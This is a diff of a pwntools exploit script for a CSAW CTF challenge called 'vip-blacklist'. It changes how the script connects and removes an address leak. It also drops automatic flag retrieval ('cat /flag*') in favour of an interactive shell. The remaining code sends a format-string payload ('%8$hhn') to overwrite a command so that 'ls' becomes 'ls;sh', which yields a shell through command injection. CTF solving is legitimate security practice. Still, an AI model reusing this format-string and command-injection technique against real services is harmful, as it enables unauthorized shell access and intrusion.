@@ -11,19 +11,16 @@ pwn.context.binary = pwn.ELF(exe.filepath)
 
 def connect():
     if len(sys.argv) > 1 and sys.argv[1] == "remote":
-        return ptr.Socket("vip-blacklist.ctf.csaw.io", 9999)
-        # return pwn.remote("vip-blacklist.ctf.csaw.io", 9999)
+        return pwn.remote("vip-blacklist.ctf.csaw.io", 9999)
     else:
-        return ptr.Process(exe.filepath)
-        # return pwn.process(exe.filepath)
+        return pwn.process(exe.filepath)
 
 
 def unwrap(x):
     if x is None:
         ptr.logger.error("unwrap failed")
         exit(1)
-    else:
-        return x
+    else: return x
 
 
 def dump():
@@ -68,9 +65,6 @@ def main():
             leak = io.recvuntil("##").strip(b"##")
             return int(leak, 16)
 
-    input_addr_in_stack = leak(1)
-    ptr.logger.info(f"input_addr_in_stack: {hex(input_addr_in_stack)}")
-
     payload = b""
     payload += b"%8$hhn"
     send(payload)
@@ -84,12 +78,7 @@ def main():
     new_command += b"ls;sh\x00"  # ls -> ls;sh
     io.sendline(new_command)
     send(b"ls;sh")
-    io.sendline(b"/bin/sh")
-    io.sendline(b"cat /flag*")
-    io.recvuntil("csawctf{")
-    flag = "csawctf{" + io.recvline().decode()
-    ptr.logger.info(f"flag: {flag}")
-    # io.interactive()
+    io.interactive()
 
     return
 
